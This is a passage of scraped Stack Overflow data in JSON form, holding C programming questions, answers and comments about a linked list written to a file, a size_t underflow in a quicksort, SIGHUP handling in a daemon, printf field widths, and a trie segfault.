"comment_id": 60254758, "body": "Thanks for the response.Just a question! It&#39;s working, you say that I populate the list backwards, but the function did create a new pointer which is positioned before the pointer l and the new list become the created list (f) + l with NULL, did not?"}, {"owner": {"reputation": 1964, "user_id": 1320881, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b69670b7cc6bce132f443eee557c9448?s=128&d=identicon&r=PG", "display_name": "Unimportant", "link": "https://stackoverflow.com/users/1320881/unimportant"}, "reply_to_user": {"reputation": 5, "user_id": 6135066, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-X0EAq6lvVd4/AAAAAAAAAAI/AAAAAAAAADE/PUJf0tw8iJM/photo.jpg?sz=128", "display_name": "Catalin Zambalic", "link": "https://stackoverflow.com/users/6135066/catalin-zambalic"}, "edited": false, "score": 0, "creation_date": 1459359171, "post_id": 36315227, "comment_id": 60254882, "body": "Yes, so the list grows backwards. If you allocate 3 nodes for example the order becomes 3-&gt;2-&gt;1-&gt;NULL."}, {"owner": {"reputation": 5, "user_id": 6135066, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-X0EAq6lvVd4/AAAAAAAAAAI/AAAAAAAAADE/PUJf0tw8iJM/photo.jpg?sz=128", "display_name": "Catalin Zambalic", "link": "https://stackoverflow.com/users/6135066/catalin-zambalic"}, "edited": false, "score": 0, "creation_date": 1459359389, "post_id": 36315227, "comment_id": 60255003, "body": "Ok, so if the list will be 3-&gt;2-&gt;1-&gt;NULL, why the while didn&#39;t read NULL(from the position 4)."}, {"owner": {"reputation": 1964, "user_id": 1320881, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b69670b7cc6bce132f443eee557c9448?s=128&d=identicon&r=PG", "display_name": "Unimportant", "link": "https://stackoverflow.com/users/1320881/unimportant"}, "reply_to_user": {"reputation": 5, "user_id": 6135066, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-X0EAq6lvVd4/AAAAAAAAAAI/AAAAAAAAADE/PUJf0tw8iJM/photo.jpg?sz=128", "display_name": "Catalin Zambalic", "link": "https://stackoverflow.com/users/6135066/catalin-zambalic"}, "edited": false, "score": 0, "creation_date": 1459359569, "post_id": 36315227, "comment_id": 60255100, "body": "Because <code>urm</code> was never set to <code>NULL</code> for item 1. <code>inserare_in_fata</code> makes the new item point to the previous one, but the first item, allocated in <code>main</code> never had it&#39;s  <code>urm</code> member set with a meaningfull value."}, {"owner": {"reputation": 5, "user_id": 6135066, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-X0EAq6lvVd4/AAAAAAAAAAI/AAAAAAAAADE/PUJf0tw8iJM/photo.jpg?sz=128", "display_name": "Catalin Zambalic", "link": "https://stackoverflow.com/users/6135066/catalin-zambalic"}, "edited": false, "score": 0, "creation_date": 1459359918, "post_id": 36315227, "comment_id": 60255308, "body": "Thank you for your answers."}], "tags": [], "owner": {"reputation": 1964, "user_id": 1320881, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b69670b7cc6bce132f443eee557c9448?s=128&d=identicon&r=PG", "display_name": "Unimportant", "link": "https://stackoverflow.com/users/1320881/unimportant"}, "is_accepted": true, "score": 0, "last_activity_date": 1459357281, "creation_date": 1459357281, "answer_id": 36315227, "question_id": 36310991, "link": "https://stackoverflow.com/questions/36310991/writhing-list-to-text-file/36315227#36315227", "title": "Writhing list to text file", "body": "<p>You populate your list backwards,so the first item allocated becomes the last in the list. But the <code>urm</code> member for this item is never initialised with <code>NULL</code> indicating it is the last item.</p>\n\n<p>In the main function:</p>\n\n<pre><code>l=(LISTA)malloc(sizeof(Lista));  //memory allocated for first (last when list is populated) item\nl-&gt;urm = NULL;  //initialise urm to NULL, indicating this is the last item\nscanf(\"%d\",&amp;x);\n//etc...\n</code></pre>\n\n<p>This way the while loop can detect the last item in the list and stop.</p>\n"}], "owner": {"reputation": 5, "user_id": 6135066, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-X0EAq6lvVd4/AAAAAAAAAAI/AAAAAAAAADE/PUJf0tw8iJM/photo.jpg?sz=128", "display_name": "Catalin Zambalic", "link": "https://stackoverflow.com/users/6135066/catalin-zambalic"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 92, "favorite_count": 0, "closed_date": 1459957537, "accepted_answer_id": 36315227, "answer_count": 1, "score": -1, "last_activity_date": 1459357281, "creation_date": 1459346148, "last_edit_date": 1459355306, "question_id": 36310991, "link": "https://stackoverflow.com/questions/36310991/writhing-list-to-text-file", "closed_reason": "Needs details or clarity", "title": "Writhing list to text file", "body": "<p>I'm trying to write a simple list in a text file.</p>\n\n<pre><code>typedef int DATA;\n\nstruct lista {\n\n    DATA info;\n    struct lista *urm;\n};\n\ntypedef struct lista Lista,*LISTA;\n\nint main()\n{\n    int x;\n    FILE *f;\n    LISTA l;\n    l=newl();\n    l=(LISTA)malloc(sizeof(Lista));\n    scanf(\"%d\",&amp;x);\n    do{\n         l=inserare_in_fata(l,x);\n         scanf(\"%d\",&amp;x);\n      } while(x!=0); // reading list elements until he read 0\n    scrieFis(f,l);\n}\nLISTA newl()\n{\n    return NULL;\n}\n\nLISTA inserare_in_fata(LISTA l,DATA x)\n{\n    LISTA f;\n    f=(LISTA)malloc(sizeof(Lista));\n        f-&gt;info=x;\n        f-&gt;urm=l;\n        return f;\n}\n\nint scrieFis(FILE *f,LISTA l)\n{\n    f=fopen(\"date.txt\",\"wt\");\n    if(f!=NULL)\n    {\n        while(l-&gt;urm!=NULL)\n        {\n            fprintf(f,\"%d \",l-&gt;info);\n            l=l-&gt;urm;\n        }\n    }\n    else\n    {\n        printf(\"Nu s-a putut realiza scrierea fisierului!\");\n        return 0;\n    }\n}\n</code></pre>\n\n<p>In the text file, the writes the list, but also after a big pack of addresses*of pointers I think).\nAt the start I prepared through function newl() to have NULL and after making another points with information and paste before l in the list.</p>\n"}, {"tags": ["c", "quicksort"], "comments": [{"owner": {"reputation": 5751, "user_id": 1101692, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/0207bd98c9e3f6f855d82aff720437aa?s=128&d=identicon&r=PG", "display_name": "Shark", "link": "https://stackoverflow.com/users/1101692/shark"}, "edited": false, "score": 1, "creation_date": 1459345806, "post_id": 36310722, "comment_id": 60244932, "body": "Look at <a href=\"http://stackoverflow.com/questions/2550774/what-is-size-t-in-c\">this question</a> to better understand what is <code>size_t</code> and why it causes a crash. HINT: it&#39;s probably due to memcpy operating with it. but you&#39;re close."}, {"owner": {"reputation": 1459, "user_id": 5410505, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/XNWBi.png?s=128&g=1", "display_name": "kamikaze", "link": "https://stackoverflow.com/users/5410505/kamikaze"}, "edited": false, "score": 0, "creation_date": 1459345893, "post_id": 36310722, "comment_id": 60245011, "body": "Why don&#39;t you debug the core dump?"}, {"owner": {"reputation": 29, "user_id": 4320333, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d4a036ba333f5beeb7c70d8b8b524137?s=128&d=identicon&r=PG&f=1", "display_name": "protream", "link": "https://stackoverflow.com/users/4320333/protream"}, "edited": false, "score": 0, "creation_date": 1459346345, "post_id": 36310722, "comment_id": 60245416, "body": "There is a problem when i debug this core dump, &quot;malloc.c: No such file or directory.&quot;"}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1459346446, "post_id": 36310722, "comment_id": 60245512, "body": "@protream What compiler, what debugger? Did you include <code>&lt;stdlib.h&gt;</code> where malloc is located?"}, {"owner": {"reputation": 29, "user_id": 4320333, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d4a036ba333f5beeb7c70d8b8b524137?s=128&d=identicon&r=PG&f=1", "display_name": "protream", "link": "https://stackoverflow.com/users/4320333/protream"}, "edited": false, "score": 0, "creation_date": 1459346854, "post_id": 36310722, "comment_id": 60245866, "body": "gdb. Seems same to this: <a href=\"http://stackoverflow.com/questions/9220853/call-to-malloc-failing-in-gdb-session\" title=\"call to malloc failing in gdb session\">stackoverflow.com/questions/9220853/&hellip;</a>"}], "answers": [{"comments": [{"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 2, "creation_date": 1459346158, "post_id": 36310841, "comment_id": 60245250, "body": "Nicely spotted. To avoid goof-up like this, use a standard compliant compiler. For example <code>gcc -std=c11 -pedantic-errors &#47;&#47; gives excellent C compiler</code> rather than <code>gcc &#47;&#47; gives non-standard crapiler</code>"}], "tags": [], "owner": {"reputation": 35932, "user_id": 1606345, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/IwiIM.png?s=128&g=1", "display_name": "David Ranieri", "link": "https://stackoverflow.com/users/1606345/david-ranieri"}, "is_accepted": false, "score": 3, "last_activity_date": 1459345789, "creation_date": 1459345789, "answer_id": 36310841, "question_id": 36310722, "link": "https://stackoverflow.com/questions/36310722/whats-wrong-with-my-generic-quick-sort/36310841#36310841", "title": "What&#39;s wrong with my generic quick sort?", "body": "<pre><code>memcpy(key, ptr + i * size, size);\n</code></pre>\n\n<p><code>ptr</code> is a <code>void *</code>, you can't use pointer arithmetic with <code>void *</code>, switch to <code>char *</code> (as <code>qsort</code> in the standard library).</p>\n"}, {"comments": [{"owner": {"reputation": 24488, "user_id": 4082723, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/LJbVr.png?s=128&g=1", "display_name": "2501", "link": "https://stackoverflow.com/users/4082723/2501"}, "reply_to_user": {"reputation": 29, "user_id": 4320333, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d4a036ba333f5beeb7c70d8b8b524137?s=128&d=identicon&r=PG&f=1", "display_name": "protream", "link": "https://stackoverflow.com/users/4320333/protream"}, "edited": false, "score": 0, "creation_date": 1459348780, "post_id": 36311566, "comment_id": 60247583, "body": "@protream Make sure you never wrap a value, or use signed types. (Don&#39;t forget to rename those functions.)"}, {"owner": {"reputation": 24488, "user_id": 4082723, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/LJbVr.png?s=128&g=1", "display_name": "2501", "link": "https://stackoverflow.com/users/4082723/2501"}, "reply_to_user": {"reputation": 29, "user_id": 4320333, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d4a036ba333f5beeb7c70d8b8b524137?s=128&d=identicon&r=PG&f=1", "display_name": "protream", "link": "https://stackoverflow.com/users/4320333/protream"}, "edited": false, "score": 0, "creation_date": 1459350013, "post_id": 36311566, "comment_id": 60248486, "body": "@protream That is explained in the answer."}], "tags": [], "owner": {"reputation": 24488, "user_id": 4082723, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/LJbVr.png?s=128&g=1", "display_name": "2501", "link": "https://stackoverflow.com/users/4082723/2501"}, "is_accepted": true, "score": 2, "last_activity_date": 1459347385, "creation_date": 1459347385, "answer_id": 36311566, "question_id": 36310722, "link": "https://stackoverflow.com/questions/36310722/whats-wrong-with-my-generic-quick-sort/36311566#36311566", "title": "What&#39;s wrong with my generic quick sort?", "body": "<pre><code>size_t i, j;\n</code></pre>\n\n<p>are unsigned types. If a value of an unsigned variable is 0, and 1 is subtracted, the value will wrap-around to the largest possible value for that unsigned type. </p>\n\n<p>This can happen on lines:</p>\n\n<pre><code>j--;\n</code></pre>\n\n<p>and:</p>\n\n<pre><code>_qsort(ptr, lrange, i - 1, size, cmp);\n</code></pre>\n\n<p>When that invalid value used as an index for an array, it will cause a seg-fault as the program cannot read an address that is out-of-bounds. </p>\n\n<hr>\n\n<p>Do not use names with the prefix <code>_</code>, <code>_qsort</code>, as those are reserved for the implementation.</p>\n"}], "owner": {"reputation": 29, "user_id": 4320333, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d4a036ba333f5beeb7c70d8b8b524137?s=128&d=identicon&r=PG&f=1", "display_name": "protream", "link": "https://stackoverflow.com/users/4320333/protream"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 69, "favorite_count": 0, "accepted_answer_id": 36311566, "answer_count": 2, "score": 1, "last_activity_date": 1459347385, "creation_date": 1459345489, "question_id": 36310722, "link": "https://stackoverflow.com/questions/36310722/whats-wrong-with-my-generic-quick-sort", "title": "What&#39;s wrong with my generic quick sort?", "body": "<p>I am trying to write a generic quicksort:</p>\n\n<pre><code>void _qsort(void *ptr, \n        size_t lrange, \n        size_t rrange,\n        size_t size,\n        int (*cmp)(const void *, const void *))\n{\n    if (lrange &lt; rrange) {\n        size_t i, j;\n        void *key;\n\n        key = malloc(size);\n        i = lrange;\n        j = rrange;\n        memcpy(key, ptr + i * size, size);\n        while (i &lt; j) {\n            while (i &lt; j &amp;&amp; (*cmp)(ptr + j * size, key) &gt; 0)\n                j--;\n            if (i &lt; j) {\n                memcpy(ptr + i * size, ptr + j * size, size);\n                i++;\n            }\n            while (i &lt; j &amp;&amp; (*cmp)(key, ptr + i * size) &gt; 0)\n                i++;\n            if (i &lt; j) {\n                memcpy(ptr + j * size, ptr + i * size, size);\n                j--;\n            }\n        }\n        memcpy(ptr + i * size, key, size);\n        _qsort(ptr, lrange, i - 1, size, cmp);\n        _qsort(ptr, i + 1, rrange, size, cmp);\n    }\n}\n</code></pre>\n\n<p>I write a simple test on a int array, this is the cmp funciton:</p>\n\n<pre><code>int cmp(const void *x, const void *y)\n{\n    return *(int *)x - *(int *)y;\n}\n</code></pre>\n\n<p>It cause a core dump, but when I change the type of <code>lrange, rrange, i, j</code> from <code>size_t</code> to <code>int</code>, it run right, I can't understand, why?</p>\n"}, {"tags": ["c", "linux", "signals"], "comments": [{"owner": {"reputation": 2506, "user_id": 3528438, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/27f8b3bc74bea842104821678137cdb2?s=128&d=identicon&r=PG&f=1", "display_name": "user3528438", "link": "https://stackoverflow.com/users/3528438/user3528438"}, "edited": false, "score": 1, "creation_date": 1459346061, "post_id": 36310703, "comment_id": 60245157, "body": "why not move section A to the signal handler?"}, {"owner": {"reputation": 31, "user_id": 6134588, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6213a056a22d17c83964778321cd69fd?s=128&d=identicon&r=PG&f=1", "display_name": "SB.Son", "link": "https://stackoverflow.com/users/6134588/sb-son"}, "reply_to_user": {"reputation": 2506, "user_id": 3528438, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/27f8b3bc74bea842104821678137cdb2?s=128&d=identicon&r=PG&f=1", "display_name": "user3528438", "link": "https://stackoverflow.com/users/3528438/user3528438"}, "edited": false, "score": 0, "creation_date": 1459347494, "post_id": 36310703, "comment_id": 60246439, "body": "i tried to move section A to the signal handler. but, if new SIGHUP signal occurs in the middle of handler execution, it executes signal handler again after finishing the handler function for the previous signal. what i want is for the next signal not to wake up pause()."}, {"owner": {"reputation": 2506, "user_id": 3528438, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/27f8b3bc74bea842104821678137cdb2?s=128&d=identicon&r=PG&f=1", "display_name": "user3528438", "link": "https://stackoverflow.com/users/3528438/user3528438"}, "edited": false, "score": 1, "creation_date": 1459347598, "post_id": 36310703, "comment_id": 60246525, "body": "<a href=\"http://stackoverflow.com/questions/5285414/signal-queuing-in-c\">stackoverflow.com/questions/5285414/signal-queuing-in-c</a>"}], "answers": [{"comments": [{"owner": {"reputation": 31, "user_id": 6134588, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6213a056a22d17c83964778321cd69fd?s=128&d=identicon&r=PG&f=1", "display_name": "SB.Son", "link": "https://stackoverflow.com/users/6134588/sb-son"}, "edited": false, "score": 0, "creation_date": 1459347002, "post_id": 36311131, "comment_id": 60246005, "body": "thank you for answering to my question, gzh. i tried to use sigprocmask() right after pause() and in the end of section A. But, after finishing Section A, section A is executed again by the signal occurred in the middle of previous signal&#39;s execution. So, what i want is for the next signal not to wake up pause()."}, {"owner": {"reputation": 2989, "user_id": 2890575, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/cf081a960a38e14ed256c34b9495ca8e?s=128&d=identicon&r=PG&f=1", "display_name": "gzh", "link": "https://stackoverflow.com/users/2890575/gzh"}, "reply_to_user": {"reputation": 31, "user_id": 6134588, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6213a056a22d17c83964778321cd69fd?s=128&d=identicon&r=PG&f=1", "display_name": "SB.Son", "link": "https://stackoverflow.com/users/6134588/sb-son"}, "edited": false, "score": 0, "creation_date": 1459387560, "post_id": 36311131, "comment_id": 60268257, "body": "@SB.Son, you should reconsider your processing flow, not only on how to block signals. please refer to the answer provided by pilcrow."}], "tags": [], "owner": {"reputation": 2989, "user_id": 2890575, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/cf081a960a38e14ed256c34b9495ca8e?s=128&d=identicon&r=PG&f=1", "display_name": "gzh", "link": "https://stackoverflow.com/users/2890575/gzh"}, "is_accepted": false, "score": 1, "last_activity_date": 1459346449, "creation_date": 1459346449, "answer_id": 36311131, "question_id": 36310703, "link": "https://stackoverflow.com/questions/36310703/how-to-block-same-signal-while-processing-a-signal/36311131#36311131", "title": "how to block same signal while processing a signal?", "body": "<p><em>pthread_sigmask()</em> can be used to mask signal in thread. <em>sigprocmask()</em> can be used to mask signal in single thread application.</p>\n"}], "owner": {"reputation": 31, "user_id": 6134588, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6213a056a22d17c83964778321cd69fd?s=128&d=identicon&r=PG&f=1", "display_name": "SB.Son", "link": "https://stackoverflow.com/users/6134588/sb-son"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 179, "favorite_count": 0, "answer_count": 1, "score": 3, "last_activity_date": 1459474629, "creation_date": 1459345431, "last_edit_date": 1459474629, "question_id": 36310703, "link": "https://stackoverflow.com/questions/36310703/how-to-block-same-signal-while-processing-a-signal", "title": "how to block same signal while processing a signal?", "body": "<p>I programmed a daemon which usually pauses and do something after getting a signal (I use SIGHUP for waking up it to another process).</p>\n\n<p>Here is my code.</p>\n\n<pre><code>...\nstatic volatile sig_atomic_t saw_hup = 0;\n\nstatic void sighup_handler(int s)\n{\n    saw_hup = 1;\n}\n\nint main(void)\n{\n    struct sigaction act_new;\n\n    ...\n    sigemptyset(&amp;act_new.sa_mask);\n    act_new.sa_handler = sighup_handler;\n    sigaction(SIGHUP, &amp;act_new, NULL);\n\n    while(1) {\n        saw_hup = 0;\n\n        pause();\n        if(saw_hup) {\n            do_section_A();\n        }\n    }\n}\n</code></pre>\n\n<p>As far as I've tested it, it seems that there is some stack for signal, so the signal, which occurs in executing section A, makes the daemon waken up from pause() execute section A again right after finishing section A by previous one.</p>\n\n<p>But, I want the next SIGHUP signal to be blocked and not to execute section A again by it.  What I want is to execute section A whenever SIGHUP occurs except for in the middle of section A executed by previous SIGHUP signal.  How do I do that?</p>\n\n<hr>\n\n<p>I think i the problem that section A is executed again right after section A execution by SIGHUP occurred in the middle of section A execution.</p>\n\n<p>Here is my modified code</p>\n\n<pre><code>...\nstatic volatile sig_atomic_t saw_hup = 0;\n\nstatic void sighup_handler(int s)\n{\n    saw_hup = 1;\n}\n\nint main(void)\n{\n    struct sigaction act_new;\n\n    ...\n    sigemptyset(&amp;act_new.sa_mask);\n    act_new.sa_handler = sighup_handler;\n    sigaction(SIGHUP, &amp;act_new, NULL);\n\n    while(1) {\n        saw_hup = 0;\n\n        pause();\n        if(saw_hup) {\n            do_section_A();\n        }\n    }\n}\n</code></pre>\n\n<p>It seems to work as i wanted. does anybody think there is any problem to this code?</p>\n"}, {"tags": ["c", "printf", "c-strings"], "answers": [{"comments": [{"owner": {"reputation": 35, "user_id": 6134911, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/85dba8cf16b0cb2ab634878ac72cddf1?s=128&d=identicon&r=PG&f=1", "display_name": "Alfredo", "link": "https://stackoverflow.com/users/6134911/alfredo"}, "edited": false, "score": 0, "creation_date": 1459346646, "post_id": 36310777, "comment_id": 60245699, "body": "Thank you so much for the help it really helped me a lot."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1459350114, "post_id": 36310777, "comment_id": 60248564, "body": "As a side note, learning about intricate printf format specifiers or other stdio details is likely a huge waste of your time, unless maybe you are aiming for a career as Linux programmer. Outside Linux, very few professional programs use stdio.h for production code."}], "tags": [], "owner": {"reputation": 29294, "user_id": 2659313, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9828b91aef4c2b3cf14f3501e0a20e33?s=128&d=identicon&r=PG", "display_name": "Mohit Jain", "link": "https://stackoverflow.com/users/2659313/mohit-jain"}, "is_accepted": true, "score": 3, "last_activity_date": 1459345607, "last_edit_date": 1495542692, "creation_date": 1459345607, "answer_id": 36310777, "question_id": 36310601, "link": "https://stackoverflow.com/questions/36310601/making-the-position-of-a-character-in-a-string-static-so-that-it-wont-move/36310777#36310777", "title": "Making the position of a character in a string static, so that it won&#39;t move", "body": "<p>I won't spoil your learning fun, just giving some hints.</p>\n\n<p><code>strlen</code> and <code>%&lt;width&gt;s</code> and <code>%&lt;-width&gt;s</code> specifiers in <a href=\"http://en.cppreference.com/w/cpp/io/c/fprintf\" rel=\"nofollow noreferrer\"><code>printf</code></a> format strings are your friends. Reading about them may help you.</p>\n\n<p>For example compare the output of</p>\n\n<pre><code>printf(\"&lt;%8s%8s&gt;\\n\", \"foo\", \"bar\");\n</code></pre>\n\n<p>v/s</p>\n\n<pre><code>printf(\"&lt;%-8s%-8s&gt;\\n\", \"foo\", \"bar\");\n</code></pre>\n\n<p>v/s</p>\n\n<pre><code>printf(\"&lt;%s%s&gt;\\n\", \"foo\", \"bar\");\n</code></pre>\n\n<p>and use some mathematics.</p>\n\n<p>Another way to achieve the functionality is to prepare your fixed length strings to be printed on the fly.</p>\n\n<p>You may also want to read <a href=\"https://stackoverflow.com/questions/2461667/centering-strings-with-printf\">Centering strings with printf()</a></p>\n"}], "owner": {"reputation": 35, "user_id": 6134911, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/85dba8cf16b0cb2ab634878ac72cddf1?s=128&d=identicon&r=PG&f=1", "display_name": "Alfredo", "link": "https://stackoverflow.com/users/6134911/alfredo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 49, "favorite_count": 0, "accepted_answer_id": 36310777, "answer_count": 1, "score": 1, "last_activity_date": 1459345738, "creation_date": 1459345203, "last_edit_date": 1459345738, "question_id": 36310601, "link": "https://stackoverflow.com/questions/36310601/making-the-position-of-a-character-in-a-string-static-so-that-it-wont-move", "title": "Making the position of a character in a string static, so that it won&#39;t move", "body": "<p>I'm new at C programming.</p>\n\n<p>What I am looking to do is to find a way to freeze the \" | \" that are in the printf statements, mainly the ones to the right of the code.</p>\n\n<p>What happens is that as you can see in the code if I put anything inside those printf statements that generate a variable amount of characters it moves the    \" | \"   accordingly to the amount of characters it generates.</p>\n\n<p>So I'm hoping to see if someone could help me with this, so that what ever is generated within the printf does not shift the position of the \" |\".</p>\n\n<p>Here's the code so that you guys have an idea f what I'm talking about.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main ()\n{\n\n    char Employee1_NameF[20];\n    char Employee1_NameL[20];\n\n        printf(\"Employee Name: \");\n        scanf(\"%s %s\", &amp;Employee1_NameF,&amp;Employee1_NameL);\n\n    printf(\" __________________________________________________________________________________________________ \\n\");\n    printf(\"|                                                                                                  |\\n\");\n    printf(\"|                                                                                                  |\\n\");\n    printf(\"|--------------------------------------------------------------------------------------------------|\\n\");\n    printf(\"|                                                                                                  |\\n\");\n    printf(\"|                                                                                                  |\\n\");\n    printf(\"|                                                                                                  |\\n\");\n    printf(\"|                                                                                                  |\\n\");\n    printf(\"|                                                                                                  |\\n\");\n    printf(\"|                                                                                                  |\\n\");\n    printf(\"|                                                                                                  |\\n\");;\n    printf(\"|__________________________________________________________________________________________________|\\n\");\n    printf(\"|--------------------------------------------------------------------------------------------------|\\n\");\n    printf(\"|         THE FACE OF THIS DOCUMENT HAS A MULTICOLORED BACKGROUND ON WHITE PAPER                   |\\n\");\n    printf(\"|--------------------------------------------------------------------------------------------------|\\n\");\n    printf(\"|                                                                                                  |\\n\");\n    printf(\"|                                                                                                  |\\n\");\n    printf(\"|                                                                                                  |\\n\");\n    printf(\"|                                                                                                  |\\n\");\n    printf(\"|                                                                                 %s %s            |\\n\",  Employee1_NameF, Employee1_NameL);\n    printf(\"|                                                                                                  |\\n\");\n    printf(\"|                                                                                                  |\\n\");\n    printf(\"|                                                                                                  |\\n\");\n    printf(\"|                                                                                                  |\\n\");\n    printf(\"|                                                                                                  |\\n\");\n    printf(\"|                                                                                                  |\\n\");\n    printf(\"|                                                                                                  |\\n\");\n    printf(\"|                                                                                                  |\\n\");\n    printf(\"|                                                                                                  |\\n\");\n    printf(\"|                                                                                                  |\\n\");\n    printf(\"|                                                                                                  |\\n\");\n    printf(\"|                                                                                                  |\\n\");\n    printf(\"|                                                                                                  |\\n\");\n    printf(\"|__________________________________________________________________________________________________|\\n\");\n}\n</code></pre>\n"}, {"tags": ["c", "pointers", "segmentation-fault", "trie"], "comments": [{"owner": {"reputation": 4268, "user_id": 5897829, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c2c7105808cb099e98f04fe464af68c6?s=128&d=identicon&r=PG&f=1", "display_name": "Martin Verjans", "link": "https://stackoverflow.com/users/5897829/martin-verjans"}, "edited": false, "score": 0, "creation_date": 1459345239, "post_id": 36310496, "comment_id": 60244474, "body": "Also, always check that malloc returned properly..."}, {"owner": {"reputation": 109, "user_id": 1833977, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/480427153799e19b23fde02269bed525?s=128&d=identicon&r=PG", "display_name": "murtaza64", "link": "https://stackoverflow.com/users/1833977/murtaza64"}, "reply_to_user": {"reputation": 11494, "user_id": 1795279, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/4TEag.jpg?s=128&g=1", "display_name": "Haris", "link": "https://stackoverflow.com/users/1795279/haris"}, "edited": false, "score": 3, "creation_date": 1459345315, "post_id": 36310496, "comment_id": 60244532, "body": "@Haris why is this? shouldn&#39;t the memory allocated be the size of the node object?"}, {"owner": {"reputation": 109, "user_id": 1833977, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/480427153799e19b23fde02269bed525?s=128&d=identicon&r=PG", "display_name": "murtaza64", "link": "https://stackoverflow.com/users/1833977/murtaza64"}, "reply_to_user": {"reputation": 11494, "user_id": 1795279, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/4TEag.jpg?s=128&g=1", "display_name": "Haris", "link": "https://stackoverflow.com/users/1795279/haris"}, "edited": false, "score": 0, "creation_date": 1459345479, "post_id": 36310496, "comment_id": 60244661, "body": "@Haris I thought if I typedef as such: typedef struct node{     bool end;     struct node* next[27]; } node; then I should be able to allocate memory of size node to a node*?"}, {"owner": {"reputation": 109, "user_id": 1833977, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/480427153799e19b23fde02269bed525?s=128&d=identicon&r=PG", "display_name": "murtaza64", "link": "https://stackoverflow.com/users/1833977/murtaza64"}, "reply_to_user": {"reputation": 11494, "user_id": 1795279, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/4TEag.jpg?s=128&g=1", "display_name": "Haris", "link": "https://stackoverflow.com/users/1795279/haris"}, "edited": false, "score": 0, "creation_date": 1459345576, "post_id": 36310496, "comment_id": 60244741, "body": "@Haris yes should have included it in OP, it was in a separate file (dictionary.h)"}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "reply_to_user": {"reputation": 11494, "user_id": 1795279, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/4TEag.jpg?s=128&g=1", "display_name": "Haris", "link": "https://stackoverflow.com/users/1795279/haris"}, "edited": false, "score": 1, "creation_date": 1459345593, "post_id": 36310496, "comment_id": 60244751, "body": "@Haris It doesn&#39;t seem correct to allocate a pointer at all. Why would he do that for? And what do you mean with &quot;Exactly, and the node object ptr is of type node * and not node&quot;. malloc returns a pointer to the allocated object... so your point is...?"}, {"owner": {"reputation": 11494, "user_id": 1795279, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/4TEag.jpg?s=128&g=1", "display_name": "Haris", "link": "https://stackoverflow.com/users/1795279/haris"}, "reply_to_user": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "edited": false, "score": 0, "creation_date": 1459345777, "post_id": 36310496, "comment_id": 60244911, "body": "@MOehm, 